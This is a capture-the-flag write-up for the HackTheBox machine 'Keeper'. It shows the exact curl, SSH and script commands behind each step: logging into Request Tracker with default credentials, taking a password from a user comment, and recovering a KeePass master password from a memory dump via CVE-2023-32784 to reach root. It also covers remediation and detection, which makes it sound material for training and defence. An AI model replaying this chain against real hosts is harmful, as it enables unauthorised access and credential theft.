---
layout: default
title: "HackTheBox - Keeper"
---

# HackTheBox - Keeper

**OS:** Linux (Ubuntu 22.04.3 LTS)

Keeper is a Linux machine that chains a default credential, a sloppy admin note, and
a real CVE. The public web root points at a Request Tracker (RT) ticketing instance
whose administrator account still uses the shipped default password `root:password`.
Inside RT, a user record carries a comment disclosing an employee's initial SSH
password, which grants the first shell. That user's home directory holds a KeePass
crash artifact (a process memory dump plus the database). KeePass 2.x before 2.54 is
vulnerable to CVE-2023-32784, which leaks the master password from process memory; a
short script recovers all but the first character. Unlocking the database exposes a
stored PuTTY private key for `root`, which after conversion to OpenSSH format yields a
root shell.

| Field | Value |
|---|---|
| Platform | HTB |
| Target | `<target-ip>` (keeper.htb / tickets.keeper.htb) |
| Initial Access | RT default creds -> credential in user-record comment -> SSH |
| Privilege Escalation | KeePass dump (CVE-2023-32784) -> master password -> root PuTTY key |
| Final Access | `root` |

---

## Recon

### Port Scan

A full TCP connect scan found only SSH and HTTP; a service sweep filled in versions.
A background `-p-` scan confirmed nothing else was listening.

```
v0idravl@v0idf0rge:~$ nmap -sCV --top-ports 100 --min-rate 5000 <target-ip>
Starting Nmap 7.99 ( https://nmap.org )
Nmap scan report for <target-ip>
Host is up (0.31s latency).
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

| Port | Proto | Service | Notes |
|---|---|---|---|
| 22 | TCP | SSH | OpenSSH 8.9p1 (Ubuntu Jammy) |
| 80 | TCP | HTTP | nginx 1.18.0 |

### Web Root -> Virtual Host

The nginx root is a single line redirecting users to a named virtual host:

```
v0idravl@v0idf0rge:~$ curl -s http://<target-ip>/
<html>
  <body>
    <a href="http://tickets.keeper.htb/rt/">To raise an IT support ticket, please visit tickets.keeper.htb/rt/</a>
  </body>
</html>
```

Two hostnames appear, `keeper.htb` and `tickets.keeper.htb`, so they go in the hosts
file (or, as used below, resolved per-request with `curl --resolve`):

```
v0idravl@v0idf0rge:~$ echo '<target-ip> keeper.htb tickets.keeper.htb' | sudo tee -a /etc/hosts
```

Fingerprinting the vhost identifies Request Tracker 4.4.4 from the footer banner:

```
v0idravl@v0idf0rge:~$ curl -s --resolve tickets.keeper.htb:80:<target-ip> http://tickets.keeper.htb/rt/ | grep -iE '<title>|RT [0-9]'
    <title>Login</title>
  <p id="bpscredits">... RT 4.4.4+dfsg-2ubuntu1 (Debian) Copyright 1996-2019 Best Practical Solutions, LLC.
```

> **Why this works:** the site offers no application logic of its own, the entire
> front door is a stock third-party product. Identifying the exact product and version
> (RT 4.4.4) immediately reframes the problem: instead of hunting for a custom bug, the
> question becomes "what are the known weaknesses and defaults of this software."

---

## Initial Access

### RT Default Administrator Credentials

Request Tracker ships with a built-in superuser, `root`, whose default password is
literally `password`. Authentication is a form POST to `NoAuth/Login.html`; using a
cookie jar to carry the session, the default pair logs straight in:

```
v0idravl@v0idf0rge:~$ curl -s --resolve tickets.keeper.htb:80:<target-ip> -c cj.txt -b cj.txt \
    "http://tickets.keeper.htb/rt/NoAuth/Login.html" \
    --data-urlencode 'user=root' --data-urlencode 'pass=password' -L -o /dev/null
v0idravl@v0idf0rge:~$ curl -s --resolve tickets.keeper.htb:80:<target-ip> -b cj.txt \
    "http://tickets.keeper.htb/rt/" | grep -iE '<title>|Logout'
    <title>RT at a glance</title>
  <li id="li-preferences-logout"><a ... href="/rt/NoAuth/Logout.html">Logout</a></li>
```

The `RT at a glance` dashboard title and the presence of a `Logout` link confirm an
authenticated administrator session.

> **Why this works:** default credentials on a management application are one of the
> highest-yield findings in any assessment. RT's `root` account is not the system root,
> it is the application superuser, but with it we can read and edit every ticket, user,
> and queue, which is plenty to harvest secrets the staff left lying around.

### Credential in a User-Record Comment

Browsing the admin panels, the user list contains `lnorgaard` (Lise Nørgaard) as user
id 27. RT lets administrators store a free-text "Comments" note on each user, and this
one was used as a sticky note for the account's initial password:

```
v0idravl@v0idf0rge:~$ curl -s --resolve tickets.keeper.htb:80:<target-ip> -b cj.txt \
    "http://tickets.keeper.htb/rt/Admin/Users/Modify.html?id=27" | grep -A0 'name="Comments"'
<textarea class="comments" name="Comments" ...>New user. Initial password set to We**********</textarea>
```

That same string is reused as the user's Linux password, so it logs straight in over
SSH:

```
v0idravl@v0idf0rge:~$ ssh lnorgaard@<target-ip>
lnorgaard@<target-ip>'s password: We**********
lnorgaard@keeper:~$ id
uid=1000(lnorgaard) gid=1000(lnorgaard) groups=1000(lnorgaard)
lnorgaard@keeper:~$ cat user.txt
<user-flag-redacted>
```

> **Gotcha worth recording:** "initial password" notes are meant to be changed on first
> login and almost never are. Always check administrative free-text fields (comments,
> descriptions, ticket bodies) for credentials, this is the same class of finding as an
> AD `description` field holding a password.

---

## Post-Exploitation Enumeration

The `lnorgaard` home directory contains an out-of-place artifact: a root-owned but
world-readable ZIP, alongside the normal dotfiles:

```
lnorgaard@keeper:~$ ls -la
-rw-r--r-- 1 root      root      87391651 ... RT30000.zip
-rw-r----- 1 root      lnorgaard       33 ... user.txt
drwx------ 2 lnorgaard lnorgaard     4096 ... .ssh
```

`RT30000.zip` is a support bundle for the very ticket seen in RT ("Issue with Keepass
Client on Windows"). It contains a KeePass database and a full process memory dump:

```
v0idravl@v0idf0rge:~$ scp lnorgaard@<target-ip>:~/RT30000.zip .
v0idravl@v0idf0rge:~$ unzip RT30000.zip
  inflating: KeePassDumpFull.dmp
 extracting: passcodes.kdbx
v0idravl@v0idf0rge:~$ file passcodes.kdbx
passcodes.kdbx: Keepass password database 2.x KDBX
```

> **Why this matters:** a `.dmp` paired with a `.kdbx` is the exact precondition for
> CVE-2023-32784. The ticket title ("Keepass Client") and the dump being a *crash*
> capture are the story the box is telling: a user reported KeePass crashing and
> attached a memory dump, not realising the dump contains the master password.

---

## Privilege Escalation

### CVE-2023-32784 - Recover the KeePass Master Password

KeePass 2.x before 2.54 builds a managed `string` for the master password as it is
typed in the `SecureTextBoxEx` control. For every character entered at position *i*
(for *i* >= 2), a remnant string survives on the managed heap consisting of a run of
the bullet placeholder `●` (U+25CF) followed by the real character, encoded UTF-16LE.
Only the first character never leaks. Scanning the dump for that pattern reconstructs
the password minus its first letter.

Rather than run the public .NET PoC unread on the attack box, the logic is small enough
to reimplement and review locally (read-only: opens the dump, prints candidates, no
network or writes):

```
v0idravl@v0idf0rge:~$ python3 CVE-2023-32784-keepass-dump.py KeePassDumpFull.dmp
[*] Per-position candidate characters (most frequent first):
  pos  2: 'A':656  '◐':49  ...
  pos  3: 'd':10
  pos  4: 'g':10
  pos  5: 'r':10
  pos  6: 'ø':10
  pos  7: 'd':10
  pos  8: ' ':10
  pos  9: 'm':10
  pos 10: 'e':10
  pos 11: 'd':10
  pos 12: ' ':10
  pos 13: 'f':10
  pos 14: 'l':10
  pos 15: 'ø':10
  pos 16: 'd':10
  pos 17: 'e':10

[*] Best-guess (position 1 unknown, prefix with '*'):
    *Adgrød med fløde
```

Position 2 is noise (the dump holds many stray `●X` pairs), but positions 3 onward are
clean and unambiguous: `dgrød med fløde`. That tail is unmistakably the Danish dessert
and tongue-twister "rødgrød med fløde", which fixes the first two characters as `rø`.
The master password is **`rødgrød med fløde`**.

> **Why this works:** the leak is a use-after-display artifact, the GUI shows bullets,
> but the underlying immutable `string` objects created on each keystroke are never
> zeroed and linger in the heap until garbage collection. Because each retained string
> is "(i-1 bullets) + (real char i)", the number of leading bullets encodes the
> character's position, letting the dump be reassembled in order. The unknown first
> character is trivially recovered from context (here, a dictionary phrase).

### Open the Database and Recover the Root Key

Unlocking the KDBX with the recovered passphrase reveals a root entry whose Notes field
holds a PuTTY-format private key:

```
v0idravl@v0idf0rge:~$ python3 -c "from pykeepass import PyKeePass; \
    kp=PyKeePass('passcodes.kdbx', password='rødgrød med fløde'); \
    [print(e.title,'|',e.username,'|',e.password) for e in kp.entries]"
keeper.htb (Ticketing Server) | root | F4********
Ticketing System | lnorgaard | We**********
...
```

The `keeper.htb (Ticketing Server)` entry's Notes contain a full `PuTTY-User-Key-File-3`
RSA key (unencrypted). PuTTY's `.ppk` format is not what OpenSSH expects, so it must be
converted. With `puttygen` available the one-liner is
`puttygen root.ppk -O private-openssh -o root_id_rsa`; on this box `puttygen` was not
installed, so the key was converted by parsing the PPK fields directly with Python's
`cryptography` library (`Public-Lines` give `e`/`n`, `Private-Lines` give `d`/`p`/`q`;
the remaining CRT parameters are derived):

```
v0idravl@v0idf0rge:~$ python3 ppk_to_openssh.py root.ppk > root_id_rsa
v0idravl@v0idf0rge:~$ chmod 600 root_id_rsa && head -1 root_id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
```

### Root

```
v0idravl@v0idf0rge:~$ ssh -i root_id_rsa root@<target-ip>
root@keeper:~# id
uid=0(root) gid=0(root) groups=0(root)
root@keeper:~# cat /root/root.txt
<root-flag-redacted>
```

> **Why this works:** the KeePass entry stored a private key, not a password, and a
> private key is a bearer credential, possession alone authenticates. The only friction
> was the `.ppk` wrapper; once the RSA parameters are extracted into a standard OpenSSH
> key, SSH accepts it as `root`.

---

## Root Cause

Three independent failures chain into full compromise:

1. **Unchanged default credentials** on the RT administrator account (`root:password`),
   exposing the entire ticketing application to anyone on the network.
2. **A secret stored in plaintext in an administrative note**, the `lnorgaard` initial
   password sitting in a user-record comment, reused verbatim as the SSH password.
3. **A sensitive process memory dump handled as an ordinary support attachment.** The
   KeePass crash dump (vulnerable to CVE-2023-32784) and the database it protects were
   bundled together and left world-readable, so recovering the master password and then
   the root SSH key was mechanical.

Break any link, change the RT default, never store the password in a comment, or never
ship the dump, and the chain falls apart.

## Impact

An unauthenticated attacker reachable on port 80 obtains the RT superuser via a default
password, pivots to an interactive SSH user through a disclosed credential, and escalates
to `root` by recovering a private key from a mishandled memory dump. The result is total
compromise of the host and of every secret in the KeePass vault, including the root key,
which would have to be rotated as part of remediation.

## Remediation

Ordered by priority; the first three break the demonstrated path.

**1. Change the RT administrator password (highest priority).** Rotate `root` in
Request Tracker to a strong unique value immediately, and audit for any other default
or shared application accounts. Default credentials on a management surface are the
single most impactful fix here.

**2. Never store credentials in free-text fields.** Remove the initial-password comment
from the `lnorgaard` user record (and audit all comments/ticket bodies for secrets).
Distribute first-login passwords out-of-band and force a change at first logon so a
stored value is useless even if found.

**3. Treat memory dumps as secrets and patch KeePass.** Upgrade KeePass to 2.54 or
later (which mitigates CVE-2023-32784), and never attach process memory dumps to
tickets, store them in access-controlled locations, scrub them, and delete them after
diagnosis. Rotate the root SSH key and the KeePass master password now that both are
exposed.

**4. Tighten file permissions and key hygiene.** `RT30000.zip` should never have been
world-readable in a user home. Restrict permissions on sensitive artifacts, and prefer
per-user keys with passphrases over storing an unencrypted root key in a shared vault.

### Validation

- Attempt RT login with `root:password` and confirm it is rejected.
- Re-read the `lnorgaard` user record and confirm no credential remains in Comments.
- Confirm `keepass --version` reports >= 2.54 and that no memory dumps are attached to
  open tickets.
- Confirm the old root key is removed from `~/.ssh/authorized_keys` after rotation.

## Detection Opportunities

- **RT default-credential login:** authentication of the `root` RT user from an external
  address, or any successful login shortly after repeated failures, in the RT and web
  access logs.
- **Credential-in-comment access:** RT logs the viewing/editing of user records; bulk
  reads of `Admin/Users/Modify.html` by one session is reconnaissance.
- **Sensitive-file transfer:** `scp`/SFTP of a large archive (`RT30000.zip`) out of a
  user home, and reads of world-readable dumps, are observable via auditd / SSH logs.
- **Root SSH key login:** a `root` SSH session by public key from an unexpected source
  IP (event in `/var/log/auth.log`: `Accepted publickey for root`), especially one not
  matching the admin's normal jump host.

## Lessons Learned

- **Fingerprint, then look up defaults.** The whole foothold was "RT 4.4.4 ships with
  `root:password`." Identifying stock software is worth more than fuzzing it.
- **Read every free-text field.** Comments, descriptions and ticket bodies are where
  humans stash passwords; this is the Linux cousin of the AD `description` credential.
- **A memory dump is a credential store.** CVE-2023-32784 is a reminder that crash dumps
  of any password-handling app can leak secrets; treat `.dmp` files as sensitive.
- **Reimplement small PoCs instead of running them blind.** The KeePass extractor and
  the PPK->OpenSSH conversion were both short enough to write and review locally, which
  avoided executing unknown third-party code on the attack box.
- **Know your key formats.** A stored `.ppk` is still a usable root credential; the only
  step was converting PuTTY's format to OpenSSH's.

---

## Cleanup

- All exploitation was performed from the attack box or in interactive SSH sessions;
  nothing was uploaded to or written on the target.
- `RT30000.zip`, the extracted dump/database, the recovered key, and the cookie jar were
  kept in private local loot only and excluded from this public writeup.
- No RT objects were modified (the user comment was only read, not changed) and no files
  on the target were altered. As remediation, the exposed root SSH key and KeePass master
  password should be rotated.
- Local artifacts (`cj.txt`, downloaded ZIP) were removed from the working directory
  after the solve.
